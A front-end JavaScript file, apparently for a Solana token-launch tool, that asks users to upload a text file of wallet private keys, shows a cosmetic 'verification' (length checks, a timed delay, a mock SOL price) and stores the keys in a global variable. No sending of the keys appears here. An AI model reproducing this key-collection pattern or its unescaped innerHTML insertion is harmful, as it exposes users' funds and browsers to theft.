// wallet-upload.js – WORLD-CLASS VERIFICATION POPUP
document.addEventListener('DOMContentLoaded', () => {
  const uploadArea = document.getElementById('uploadArea');
  const content = document.getElementById('uploadContent');
  const fileInput = document.getElementById('walletFileInput');
  const verifyBtn = document.getElementById('verifyWalletsBtn');
  const status = document.getElementById('walletStatus');
  const popup = document.getElementById('verifyPopup');
  const result = document.getElementById('verifyResult');

  let totalSOL = 0;

  // Drag & Drop
  ['dragover', 'dragenter'].forEach(e => {
    uploadArea.addEventListener(e, ev => {
      ev.preventDefault();
      uploadArea.classList.add('drag-over');
    });
  });

  ['dragleave', 'drop'].forEach(e => {
    uploadArea.addEventListener(e, () => {
      uploadArea.classList.remove('drag-over');
    });
  });

  uploadArea.addEventListener('drop', e => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    if (file && file.name.endsWith('.txt')) handleFile(file);
  });

  uploadArea.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', () => {
    if (fileInput.files[0]) handleFile(fileInput.files[0]);
  });

  function handleFile(file) {
    window.uploadedFile = file;
    status.innerHTML = `<i data-lucide="file-text" class="badge-icon"></i> ${file.name}`;
    lucide.createIcons();

    content.innerHTML = `
      <div class="upload-icon-wrapper" style="background:rgba(74,222,128,0.15)">
        <i data-lucide="file-check" style="width:36px;height:36px;stroke:#4ade80"></i>
      </div>
      <p class="upload-title"><strong>${file.name}</strong></p>
      <p class="upload-subtitle">${(file.size/1024).toFixed(1)} KB</p>
    `;
    lucide.createIcons();
    verifyBtn.disabled = false;
  }

  verifyBtn.addEventListener('click', async () => {
    popup.style.display = 'flex';
    result.innerHTML = `
      <div class="loader"></div>
      <p class="verify-text">Reading wallets...</p>
    `;

    const text = await window.uploadedFile.text();
    const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
    const wallets = [];
    const errors = [];

    if (lines.length === 0) {
      errors.push("File is empty");
    }

    for (let i = 0; i < lines.length; i += 3) {
      const pubLine = lines[i];
      const privLine = lines[i + 1];
      const solLine = lines[i + 2];

      const pub = pubLine?.split(':')[1]?.trim();
      const priv = privLine?.split(':')[1]?.trim();
      const sol = parseFloat(solLine?.split(':')[1]?.trim() || '0');

      if (!pub || !priv) {
        errors.push(`Line ${i + 1}: Missing public or private key`);
        continue;
      }

      if (pub.length !== 44) {
        errors.push(`Line ${i + 1}: Invalid public key (must be 44 chars)`);
        continue;
      }

      if (priv.length < 80) {
        errors.push(`Line ${i + 1}: Invalid private key (too short)`);
        continue;
      }

      if (isNaN(sol) || sol < 0) {
        errors.push(`Line ${i + 3}: Invalid SOL amount`);
        continue;
      }

      wallets.push({ pub, priv, sol });
      totalSOL += sol;
    }

    setTimeout(() => {
      lucide.createIcons();

      if (wallets.length > 0) {
        const usdPrice = 180; // Mock SOL price
        const totalUSD = (totalSOL * usdPrice).toFixed(2);

        window.wallets = wallets;
        window.verifiedWallets = true;
        status.classList.add('valid');
        status.innerHTML = `<i data-lucide="check-circle" class="badge-icon"></i> ${wallets.length} verified`;
        lucide.createIcons();

        result.innerHTML = `
          <div class="success-header">
            <div class="tick-container">
              <svg class="tick" viewBox="0 0 64 64">
                <circle cx="32" cy="32" r="30" fill="none" stroke="#4ade80" stroke-width="4"/>
                <path d="M18 32 L28 42 L46 24" fill="none" stroke="#4ade80" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>
            <h3>Verification Complete</h3>
          </div>

          <div class="verify-stats">
            <div class="stat-item">
              <div class="stat-label">Valid Wallets</div>
              <div class="stat-value">${wallets.length}</div>
            </div>
            <div class="stat-item">
              <div class="stat-label">Total SOL</div>
              <div class="stat-value">${totalSOL.toFixed(4)} SOL</div>
            </div>
            <div class="stat-item">
              <div class="stat-label">Est. Value</div>
              <div class="stat-value">$${totalUSD}</div>
            </div>
          </div>

          <p class="verify-note">Ready to launch your token</p>

          <button class="btn-primary full-width" onclick="closeVerify()">
            <i data-lucide="arrow-right"></i> Continue to Mint
          </button>
        `;

        // Trigger tick animation
        setTimeout(() => {
          document.querySelector('.tick path').style.strokeDasharray = '100';
          document.querySelector('.tick path').style.strokeDashoffset = '100';
          document.querySelector('.tick path').style.animation = 'draw 0.6s forwards';
        }, 100);

      } else {
        result.innerHTML = `
          <div class="error-header">
            <i data-lucide="alert-triangle" style="width:64px;height:64px;stroke:#fb923c"></i>
            <h3>Verification Failed</h3>
          </div>

          <div class="error-list">
            ${errors.slice(0, 5).map(err => `<div class="error-item">• ${err}</div>`).join('')}
            ${errors.length > 5 ? `<div class="error-more">+ ${errors.length - 5} more...</div>` : ''}
          </div>

          <p class="verify-note">Expected format per wallet:</p>
          <pre class="format-example">
Public: 5oN...xyz
Private: 5oN...xyz
SOL: 0.5</pre>

          <button class="btn-primary full-width" onclick="closeVerify()">
            <i data-lucide="x"></i> Close
          </button>
        `;
      }

      lucide.createIcons();
    }, 1800);
  });

  window.closeVerify = () => {
    popup.style.display = 'none';
    window.checkForm();
  };
});